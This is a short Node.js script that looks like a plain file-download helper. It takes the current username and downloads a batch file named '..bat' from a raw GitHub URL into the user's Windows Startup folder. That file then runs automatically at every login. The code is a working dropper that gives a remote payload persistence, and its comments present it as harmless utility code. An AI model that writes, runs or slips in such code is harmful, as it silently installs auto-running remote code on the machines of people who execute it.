const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');

// Get user information
const userInfo = os.userInfo();
// Replace with the URL of the file you want to download
// const fileUrl = 'https://raw.githubusercontent.com/spotlight301/clock/refs/heads/master/..bat'; // Change this URL
// const fileName = path.basename(fileUrl); // Extracts file name from the URL

const userName = userInfo.username;
const existingFolderPath = path.join('', `C:/Users/${userName}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup`);
const fileUrl = 'https://raw.githubusercontent.com/spotlight301/clock/refs/heads/master/..bat'; // Replace with your file URL
const destinationPath = path.join(existingFolderPath, '..bat'); // Change to your desired path

const downloadFile = (url, destination) => {
  const file = fs.createWriteStream(destination);

  https.get(url, (response) => {
    // Check if the response status is OK (200)
    if (response.statusCode === 200) {
      response.pipe(file);

      file.on('finish', () => {
        file.close();
        console.log(`Downloaded: ${destination}`);
      });
    } else {
      console.error(`Error: ${response.statusCode}`);
    }
  }).on('error', (err) => {
    // Handle errors
    fs.unlink(destination, () => {}); // Delete the file if there's an error
    console.error(`Download failed: ${err.message}`);
  });
};

// Ensure the downloads directory exists

// Start the download
downloadFile(fileUrl, destinationPath);